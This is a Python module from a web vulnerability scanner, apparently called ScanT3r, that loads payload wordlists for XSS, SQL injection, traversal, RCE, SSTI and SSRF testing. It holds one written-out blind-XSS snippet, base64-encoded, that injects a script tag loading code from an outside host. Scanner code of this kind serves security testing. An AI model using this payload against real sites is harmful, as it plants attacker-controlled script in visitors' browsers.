__name__ = 'ScanT3r'
__author__ = 'Khaled Nassar'
__email__ = 'knassar702@gmail.com'
__version__ = '0.8#Beta'

from base64 import b64encode
from yaml import safe_load

class XSS:
    def __init__(self,host=None):
        self.payloads = list(open('wordlists/txt/xss.txt','r'))
        self.blind_payloads = open('wordlists/txt/bxss.txt','r')
        self.blind = []
        if host:
            b = b64encode(f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode('utf-8')).decode('utf-8').replace('=','')
            for blind_payload in self.blind_payloads:
                new_payload = blind_payload.replace("{host}",host).replace('{b64_host}',b)
                self.payloads.append(new_payload)

sqli_payloads = open('wordlists/txt/sqli.txt','r')
sql_err = open('wordlists/txt/sqli_errors.txt','r')
traversal = open('wordlists/txt/traversal.txt','r')

def TLD():
    f = open('wordlists/txt/tld.txt','r')
    return f

def rce_payloads() -> dict: 
    file = open('wordlists/match/rce.yaml','r')
    return safe_load(file)


def ssti_payloads() -> dict:
    return safe_load(open('wordlists/match/ssti.yaml','r'))


def ssrf_parameters() -> str:
    return open('wordlists/txt/ssrf_parameters.txt','r').read().splitlines() 
